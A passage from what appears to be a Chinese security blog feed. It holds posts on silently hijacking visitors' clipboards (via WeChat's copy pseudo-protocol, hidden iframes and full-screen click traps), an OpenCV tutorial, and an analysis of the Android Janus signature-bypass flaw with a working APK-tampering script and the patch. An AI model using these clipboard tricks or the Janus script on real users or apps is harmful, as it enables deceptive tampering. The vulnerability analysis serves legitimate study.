class="string">'mouseleave'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'mousemove'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'mouseout'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'mouseover'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'mouseup'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'mousewheel'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'pause'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'play'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'playing'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'progress'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'ratechange'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'reset'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'seeked'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'seeking'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'select'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'stalled'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'submit'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'suspend'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'timeupdate'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'toggle'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'volumechange'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'waiting'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'wheel'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'auxclick'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'gotpointercapture'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'lostpointercapture'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'pointerdown'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'pointermove'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'pointerup'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'pointercancel'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'pointerover'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'pointerout'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'pointerenter'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'pointerleave'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'beforecopy'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'beforecut'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'beforepaste'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'copy'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'cut'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'paste'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'search'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'selectstart'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'webkitfullscreenchange'</span>, copy, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">'webkitfullscreenerror'</span>, copy, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure></p><p>通过实验，我们得出以下结论：</p><ol><li>移动端包括Android和iOS都需要点击一下屏幕，无法实现网页加载自动复制。注意是点击一下，而不是滑动。</li><li>PC端其实不需要点击，只需要鼠标移动，即可实现复制</li></ol><p>既然移动端必须要点一下，我们研究实现了再屏幕上任意位置点击，即可写入剪贴板</p><h1 id="Android实现"><a href="#Android实现" class="headerlink" title="Android实现"></a>Android实现</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">"text"</span> id=<span class="string">"website"</span> value=<span class="string">"http://www.sitepoint.com/"</span> /&gt;</span><br><span class="line">&lt;button data-copytarget=<span class="string">"#website"</span> id=<span class="string">"aaa"</span>&gt;copy&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script type="text/</span>javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">document.body.addEventListener('mouseup', copy, true);</span></span><br><span class="line"><span class="string">// event handler</span></span><br><span class="line"><span class="string">function copy(e) &#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    website.select()</span></span><br><span class="line"><span class="string"> document.execCommand('copy');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h1 id="iOS实现"><a href="#iOS实现" class="headerlink" title="iOS实现"></a>iOS实现</h1><p>iOS不支持execCommand，这里用一个叫clipboard.js（<a href="https://clipboardjs.com/）的库，将一个div占满屏幕，然后用户点击任意位置就可以触发点击事件了。" target="_blank" rel="noopener">https://clipboardjs.com/）的库，将一个div占满屏幕，然后用户点击任意位置就可以触发点击事件了。</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!-- <span class="number">1.</span> Define some markup --&gt;</span><br><span class="line">    &lt;div id=<span class="string">"btn"</span> style=<span class="string">"position:absolute;width:100%;height:100%;"</span> data-clipboard-text=<span class="string">"KjABgP05ll"</span>&gt;</span><br><span class="line">        &lt;span&gt;Copy&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- <span class="number">2.</span> Include library --&gt;</span><br><span class="line">    &lt;script src=<span class="string">"https://cdn.jsdelivr.net/npm/clipboard@1/dist/clipboard.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">    &lt;!-- <span class="number">3.</span> Instantiate clipboard by passing a HTML element --&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">'btn'</span>);</span><br><span class="line">    <span class="keyword">var</span> clipboard = <span class="keyword">new</span> Clipboard(btn);</span><br><span class="line">    clipboard.on(<span class="string">'success'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">    &#125;);</span><br><span class="line">    clipboard.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure><h1 id="利用微信实现"><a href="#利用微信实现" class="headerlink" title="利用微信实现"></a>利用微信实现</h1><ul><li>devicemotion事件</li></ul><p>html5提供了几个新的DOM事件来获得设备物理方向及运动的信息，包括：陀螺仪、罗盘及加速计等，devicemotion就是其中一种，例如我们常用的摇一摇功能就是利用了该事件。注册了devicemotion事件后，只要用户轻轻动一下手机，就会触发事件代码。</p><ul><li>微信写入剪贴板的伪协议</li></ul><p>微信Android客户端注册了一个伪协议：weixin://webview/copy/xxxxxxx，对该协议发起请求后，微信会自动将xxxxxxx写入剪贴板。</p><p>结合上述两个特性，很容易实现只要打开网页，就会自动写入剪贴板，而微信一定程度上成为了自动传播吱口令的“帮凶”，具体实现如下：<br>    网页注册devicemotion事件，触发后新建一个iframe发起对伪协议的请求<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.DeviceMotionEvent) &#123;</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'devicemotion'</span>, handler, <span class="literal">false</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    alert(<span class="string">'not support devicemotion'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handler</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> b = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">b.style.cssText = <span class="string">"display:none;width:0px;height:0px;"</span>;</span><br><span class="line">b.src = <span class="string">"weixin://webview/copy/"</span> + <span class="string">"m4bln"</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="利用apple设备的“通用剪贴板”"><a href="#利用apple设备的“通用剪贴板”" class="headerlink" title="利用apple设备的“通用剪贴板”"></a>利用apple设备的“通用剪贴板”</h1><p>apple设备的“通用剪贴板”，可以在一台 Apple 设备上拷贝文本、图像、照片和视频，然后在另一台 Apple 设备上粘贴该内容。利用通用剪贴板，当用户在PC上点击恶意网页时，吱口令会自动写入到PC的剪贴板，同时“通用剪贴板”机制也会把吱口令写入到手机的剪贴板，此时，用户打开手机上的支付宝，就会进入红包页面。</p><p>使用“通用剪贴板”必须满足设备“连续互通”的要求（<a href="https://support.apple.com/zh-cn/HT204689）" target="_blank" rel="noopener">https://support.apple.com/zh-cn/HT204689）</a></p><ul><li>所有设备均使用同一 Apple ID 登录 iCloud。</li><li>所有设备均已开启蓝牙。</li><li>所有设备均已开启 Wi-Fi。</li></ul><p>但实际测试似乎只要满足登录同一个Apple ID即可。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>OpenCV学习</title>
      <link href="/2017/12/25/OpenCV%E5%AD%A6%E4%B9%A0/"/>
      <url>/2017/12/25/OpenCV%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="打开图片"><a href="#打开图片" class="headerlink" title="打开图片"></a>打开图片</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">img = cv2.imread(<span class="string">'hat.png'</span>)</span><br><span class="line">cv2.imshow(<span class="string">'image'</span>, img)</span><br><span class="line">cv2.waitKey(<span class="number">0</span>) <span class="comment">#没有waitKey没办法显示</span></span><br></pre></td></tr></table></figure><h2 id="通道提取"><a href="#通道提取" class="headerlink" title="通道提取"></a>通道提取</h2><blockquote><p>图像通道，在RGB色彩模式下就是指那单独的红色、绿色、蓝色部分。也就是说，一幅完整的图像，是由红色绿色蓝色三个通道组成的。他们共同作用产生了完整的图像。<br>阿尔法通道(Alpha Channel)是指一张图片的透明和半透明度。例如：一个使用32位存储的图片，每8位表示红绿蓝，和阿尔法通道。在这种情况下，就不光可以表示透明还是不透明，阿尔法通道还可以表示256级的半透明度。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">r,g,b,a = cv2.split(img) </span><br><span class="line">cv2.imshow(<span class="string">"Blue"</span>,r)  </span><br><span class="line">cv2.imshow(<span class="string">"Red"</span>,g)  </span><br><span class="line">cv2.imshow(<span class="string">"Green"</span>,b) </span><br><span class="line">cv2.imshow(<span class="string">"Alpha"</span>,a)  </span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#jpg等压缩格式没有Alpha通道</span></span><br></pre></td></tr></table></figure><h2 id="通道合并"><a href="#通道合并" class="headerlink" title="通道合并"></a>通道合并</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">merged = cv2.merge([b,g,r]) <span class="comment">#前面分离出来的三个通道</span></span><br></pre></td></tr></table></figure><h2 id="灰度转换"><a href="#灰度转换" class="headerlink" title="灰度转换"></a>灰度转换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gray = cv2.cvtColor(img,cv2.COLOR_BGR2GRAY)</span><br><span class="line">cv2.imshow(<span class="string">'image'</span>, gray)</span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2 id="人脸检测"><a href="#人脸检测" class="headerlink" title="人脸检测"></a>人脸检测</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">face_patterns = cv2.CascadeClassifier(<span class="string">'haarcascade_frontalface_default.xml'</span>)//xml文件为opencv在GitHub上共享出来的具有普适的训练好的数据</span><br><span class="line">sample_image = cv2.imread(<span class="string">'muti.jpg'</span>)</span><br><span class="line">faces = face_patterns.detectMultiScale(sample_image,</span><br><span class="line">                                       scaleFactor=<span class="number">1.1</span>,</span><br><span class="line">                                       minNeighbors=<span class="number">8</span>,</span><br><span class="line">                                       minSize=(<span class="number">50</span>, <span class="number">50</span>))</span><br><span class="line">                                       </span><br><span class="line"><span class="keyword">print</span> len(faces)</span><br><span class="line"><span class="keyword">for</span>(x,y,w,h) <span class="keyword">in</span> faces:</span><br><span class="line">    cv2.circle(sample_image,((x+x+w)/<span class="number">2</span>,(y+y+h)/<span class="number">2</span>),w/<span class="number">2</span>,(<span class="number">0</span>,<span class="number">255</span>,<span class="number">0</span>),<span class="number">2</span>)</span><br><span class="line">cv2.imshow(<span class="string">"Find Faces!"</span>,sample_image)</span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>（待补充）安卓“Janus”漏洞分析（CVE-2017-13156)</title>
      <link href="/2017/12/11/%E5%AE%89%E5%8D%93%E2%80%9CJanus%E2%80%9D%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88cve-%EF%BC%89/"/>
      <url>/2017/12/11/%E5%AE%89%E5%8D%93%E2%80%9CJanus%E2%80%9D%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88cve-%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>“Janus”漏洞是Google在12月发布的安卓系统的安全公告中披露的，由移动安全公司GuardSquare 的研究团队发现，漏洞编号：CVE-2017-13156。该漏洞的可以绕过Andorid的签名校验机制，攻击者可以利用漏洞通过升级的方式对App进行篡改。</p><p>由于安卓系统中App的安全和可信都是建立在签名和校验基础之上，“Janus”漏洞绕过了系统的签名校验，可以说是突破了安卓整个安全机制，导致安卓整个安全体系的沦陷。</p><blockquote><p>一旦攻击者将植入恶意代码的仿冒的App投放到安卓商店等第三方应用市场，就可替代原有的App做下载、更新。网友安装这些仿冒App后，不仅会泄露个人账号、密码、照片、文件等隐私信息，手机更可能被植入木马病毒，进而或导致手机被ROOT，甚至被远程操控。</p></blockquote><h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><ol><li>安卓5.0-8.0的各个版本系统；</li><li>使用安卓Signaturescheme V1签名的App APK文件。</li></ol><p>由于，signature scheme V2需要对App进行重新发布，而大量的已经存在的App APK无法使用V2校验机制，所以为了保证向前兼容性，V1的校验方式的还被保留,故该漏洞影响范围较大。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>1、安卓在4.4中引入了新的执行虚拟机ART，这个虚拟机经过重新的设计，实现了大量的优化，提高了应用的运行效率。与“Janus”有关的一个技术点是，ART允许运行一个raw dex，也就是一个纯粹的dex文件，不需要在外面包装一层zip。而ART的前任DALVIK虚拟机就要求dex必须包装在一个zip内部且名字是classes.dex才能运行。当然ART也支持运行包装在ZIP内部的dex文件，要区别文件是ZIP还是dex，就通过文件头的magic字段进行判断：ZIP文件的开头是‘PK’, 而dex文件的开头是’dex’.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">代码部分</span><br></pre></td></tr></table></figure></p><p>2、APK本质是一个ZIP文件，ZIP文件的读取方式是通过在文件末尾定位central directory, 然后通过里面的索引定位到各个zip entry，每个entry解压之后都对应一个文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">代码部分</span><br></pre></td></tr></table></figure></p><p>因此：</p><ul><li>对于上述1,ART通过文件头判断是否为dex文件，然后按照dex的格式进行解析，而如果在dex文件之后附加其他数据，完全不影响其工作机制</li><li>对于上述2，系统在解析一个APK文件时，是从文件末尾寻找central directory标志，然后依次展开解析的。如果在一个ZIP文件头部追加任意数据，也完全不影响整个APK解析过程。（ZIP/APK文件中数据的偏移需要改动）</li></ul><p>所以，攻击者构造一个（恶意dex+合法APK）文件，并修改好APK中部分数据的偏移，如下图，则可以同时满足上述两个条件。而上述1为Android执行代码的入口，即ART会执行我们构造的恶意dex;上述2完成解析后会对APK进行签名校验,实际校验时，参与校验运算的数据均为合法APK的数据。</p><p><img src="/images/pasted-8.png" alt="upload successful"></p><p>简而言之，构造的畸形文件既可以通过签名校验部分，又可以执行攻击者构造的任意代码，巧妙的绕过Android的应用安全机制。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li>攻击者可以向APK文件的开始位置放置一个攻击的DEX文件A；</li><li>安卓系统在安装时用ZIP的读取机制从末尾开始进行文件的读取，读取到了原始的APK内容，并且以V1的方式进行校验，认为这个文件是正常的，没有篡改，APK安装成功；</li><li>在运行时，Android的ART虚拟机从文件头开始读取，发现是一个DEX文件，直接执行，攻击文件A被最终执行。</li></ol><p>利用代码如下，来自V-E-O的github<br><a href="https://github.com/V-E-O/PoC/tree/373104bea150895e10879e87fcecfa0318c82647/CVE-2017-13156" target="_blank" rel="noopener">https://github.com/V-E-O/PoC/tree/373104bea150895e10879e87fcecfa0318c82647/CVE-2017-13156</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> zlib <span class="keyword">import</span> adler32</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_checksum</span><span class="params">(data)</span>:</span></span><br><span class="line">    m = hashlib.sha1()</span><br><span class="line">    m.update(data[<span class="number">32</span>:])</span><br><span class="line">    data[<span class="number">12</span>:<span class="number">12</span>+<span class="number">20</span>] = m.digest()</span><br><span class="line"></span><br><span class="line">    v = adler32(buffer(data[<span class="number">12</span>:])) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    data[<span class="number">8</span>:<span class="number">12</span>] = struct.pack(<span class="string">"&lt;L"</span>, v)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        print(<span class="string">"usage: %s dex apk out_apk"</span> % __file__)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    _, dex, apk, out_apk = sys.argv</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(dex, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        dex_data = bytearray(f.read())</span><br><span class="line">    dex_size = len(dex_data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(apk, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        apk_data = bytearray(f.read())</span><br><span class="line">    cd_end_addr = apk_data.rfind(<span class="string">'\x50\x4b\x05\x06'</span>)</span><br><span class="line">    cd_start_addr = struct.unpack(<span class="string">"&lt;L"</span>, apk_data[cd_end_addr+<span class="number">16</span>:cd_end_addr+<span class="number">20</span>])[<span class="number">0</span>]</span><br><span class="line">    apk_data[cd_end_addr+<span class="number">16</span>:cd_end_addr+<span class="number">20</span>] = struct.pack(<span class="string">"&lt;L"</span>, cd_start_addr+dex_size)</span><br><span class="line"></span><br><span class="line">    pos = cd_start_addr</span><br><span class="line">    <span class="keyword">while</span> (pos &lt; cd_end_addr):</span><br><span class="line">        offset = struct.unpack(<span class="string">"&lt;L"</span>, apk_data[pos+<span class="number">42</span>:pos+<span class="number">46</span>])[<span class="number">0</span>]</span><br><span class="line">        apk_data[pos+<span class="number">42</span>:pos+<span class="number">46</span>] = struct.pack(<span class="string">"&lt;L"</span>, offset+dex_size)</span><br><span class="line">        pos = apk_data.find(<span class="string">"\x50\x4b\x01\x02"</span>, pos+<span class="number">46</span>, cd_end_addr)</span><br><span class="line">        <span class="keyword">if</span> pos == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    out_data = dex_data + apk_data</span><br><span class="line">    out_data[<span class="number">32</span>:<span class="number">36</span>] = struct.pack(<span class="string">"&lt;L"</span>, len(out_data))</span><br><span class="line">    update_checksum(out_data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(out_apk, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(out_data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'%s generated'</span> % out_apk)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>需要注意的是，ART在执行恶意dex时，由于需要和真实APK中的AndroidManifest.xml相对应，多数情况下受到很多限制，例如：</p><ul><li>用来构造畸形文件的APK必须是被攻击APP的新版本，否则Android系统会拒绝安装</li><li>恶意dex的包名、入口类等需要与被攻击APP完全一致</li><li>恶意dex需要实现被攻击APK的provider</li><li><application>标签里的android:name类需要实现</application></li><li>setContentView的资源文件id需要和被攻击APP一致</li><li>通过重打包的方式构造攻击dex文件市，需要考虑原APK为多dex的情况，因为此漏洞只能执行一个恶意dex文件</li></ul><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>修复代码如下，在解析APK的时候对文件头（LocalFileHeader::kSignature）进行了验证，如果文件头不对，停止解析。<br><a href="https://android.googlesource.com/platform/system/core/+/9dced1626219d47c75a9d37156ed7baeef8f6403%5E%21/#F0" target="_blank" rel="noopener">https://android.googlesource.com/platform/system/core/+/9dced1626219d47c75a9d37156ed7baeef8f6403%5E%21/#F0</a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/libziparchive/zip_archive.cc b/libziparchive/zip_archive.cc</span><br><span class="line">index <span class="number">78</span>de40a..d0bbd72 <span class="number">100644</span></span><br><span class="line">--- a/libziparchive/zip_archive.cc</span><br><span class="line">+++ b/libziparchive/zip_archive.cc</span><br><span class="line">@@ <span class="number">-441</span>,<span class="number">6</span> +<span class="number">441</span>,<span class="number">22</span> @@</span><br><span class="line">       <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">uint32_t</span> lfh_start_bytes;</span><br><span class="line">+  <span class="keyword">if</span> (!archive-&gt;mapped_zip.ReadAtOffset(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint8_t</span>*&gt;(&amp;lfh_start_bytes),</span><br><span class="line">+                                        <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>), <span class="number">0</span>)) &#123;</span><br><span class="line">+    ALOGW(<span class="string">"Zip: Unable to read header for entry at offset == 0."</span>);</span><br><span class="line">+    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">if</span> (lfh_start_bytes != LocalFileHeader::kSignature) &#123;</span><br><span class="line">+    ALOGW(<span class="string">"Zip: Entry at offset zero has invalid LFH signature %"</span> PRIx32, 